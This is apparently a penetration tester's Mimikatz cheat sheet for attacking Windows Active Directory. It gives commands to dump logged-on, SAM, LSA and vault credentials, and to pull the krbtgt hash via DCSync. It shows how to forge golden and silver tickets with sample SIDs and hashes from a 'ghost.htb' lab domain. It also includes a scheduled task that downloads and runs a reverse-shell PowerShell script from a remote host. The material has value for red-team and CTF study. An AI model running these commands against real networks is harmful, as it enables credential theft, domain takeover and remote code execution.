https://github.com/gentilkiwi/mimikatz

```mimikatz
mimikatz.exe

# Elevate Privileges
privilege::debug

# Elevate privileges to SYSTEM by impersonation
token::elevate

# Dump logged on user and computer credentials
sekurlsa::logonpasswords 

# Retrieves credential from LSA
lsadump::lsa /patch

#
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\System SystemBkup.hiv

# Retrieves and displays password hashes of local user accounts.
lsadump::sam

# Extracts and displays password hashes from the provided backup hive files.
lsadump::sam SystemBkup.hiv SamBkup.hiv

# Requests and retrieves password hashes for the specified user from the DC.
lsadump::dcsync /user:krbtgt

# List credentials in CredentialManager
vault::list

# Dump credentials in CredentialManager - plaintext password
vault::cred /patch
```

### Golden Ticket
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
```
# Dump hashes - Get the krbtgt hash
lsadump::trust /patch -ComputerName ghost.htb

# Golden Ticket
kerberos::golden /ticket:aaa.kirbi /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:dae1ad83e2af14a379017f244a2f5297 /user:administrator /service:krbtgt /target:GHOST.HTB

# Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
lsadump::dcsync /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498 /user:Administrator

# Check WMI Permission
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

### Silver Ticket
https://adsecurity.org/?p=2011
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets

#### Make silver ticket for CIFS
Use the hash of the local computer
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
```

Check access (After CIFS silver ticket)
```
ls \\<servername>\c$\
```

#### Make silver ticket for Host
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
```

Schedule and execute a task (After host silver ticket)
```
schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <target> /TN “Reverse”
```

#### Make silver ticket for WMI
Execute for WMI /service:HOST /service:RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
```

Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```